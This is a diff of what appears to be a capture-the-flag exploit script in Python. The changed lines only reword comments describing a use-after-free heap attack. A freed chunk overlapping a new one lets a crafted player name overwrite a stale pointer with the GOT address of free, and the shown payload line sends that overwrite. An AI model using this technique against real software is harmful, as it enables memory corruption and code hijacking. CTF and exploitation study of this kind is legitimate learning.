@@ -89,9 +89,9 @@ if __name__ == "__main__":
     # -> malloc("EEEE....EEEE" + "\x18\x30\x60") -> 16+3+1 bytes from unsorted bin (previous chunk A-1)
     # so, chunk A-1 which has been deleted overlaps with chunk E-2 (player name "EEEEE....")
     # and we can still access chunk A-1 via 'selected'
-    # so, a carefully crafted name for chunk E will overwrite chunk A-1's name_ptr
-    # so we can manipulate 'chunk A-1'->name_ptr.
-    # and future set_name() will reference the overwritten pointer. 
+    # and a carefully crafted name for chunk E will overwrite chunk A-1's name_ptr
+    # and 'selected' still points chunk A-1
+    # so future set_name() call which references 'selected' will use the overwritten pointer, name_ptr.
 
     add('E'*16 + p64(b.got['free']), 0xfe)              # overwrite selected->name_ptr with 0x603018 (GOT of free)
     raw_input('after adding E...')
